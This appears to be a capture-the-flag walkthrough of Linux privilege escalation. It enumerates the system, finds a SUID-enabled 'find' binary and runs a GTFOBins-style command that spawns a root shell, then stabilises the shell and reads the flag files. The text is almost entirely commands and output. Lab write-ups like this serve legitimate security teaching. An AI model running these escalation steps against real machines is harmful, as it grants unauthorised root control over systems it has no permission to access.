Check what user you are

```

whoami
id

# Check OS and kernel
uname -a
cat /etc/os-release

# Check current directory
pwd
ls -la

# Check sudo rights
sudo -l
# (sudo: unable to resolve host: no sudo entry found)
```

SUID Binary Hunt
```# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Output:
# /usr/bin/sudo
# /usr/bin/passwd
# /usr/bin/gpasswd
# /usr/bin/chsh
# /usr/bin/chfn
# /usr/bin/newgrp
# /usr/bin/at
# /usr/bin/umount
# /usr/bin/mount
# /usr/bin/fusermount
# /usr/bin/su
# /usr/bin/pkexec
# /usr/lib/dbus-1.0/dbus-daemon-launch-helper
# /usr/lib/openssh/ssh-keysign
# /usr/lib/eject/dmcrypt-get-device
# /usr/bin/arping
# /usr/bin/find      <<<<<< INTERESTING!

# Check find version
find --version
# find (GNU findutils) 4.7.0
```

Check GTFOBins
```# According to GTFOBins, find with SUID can execute commands as root
# Test if find has SUID
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root 321432 Jan 1 2020 /usr/bin/find
# The 's' means SUID bit is set!

# Exploit find
find . -exec /bin/sh \; -quit

# Did it work?
whoami
# root!
```

Verify Root Access
```# Get fully interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Confirm root
id
# uid=0(root) gid=0(root) groups=0(root)

# Get flags
cat /root/root.txt
# 3f7b2a9c8e1d5f6a9b2c3d4e5f6a7b8c

cat /home/user/user.txt
# 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
```


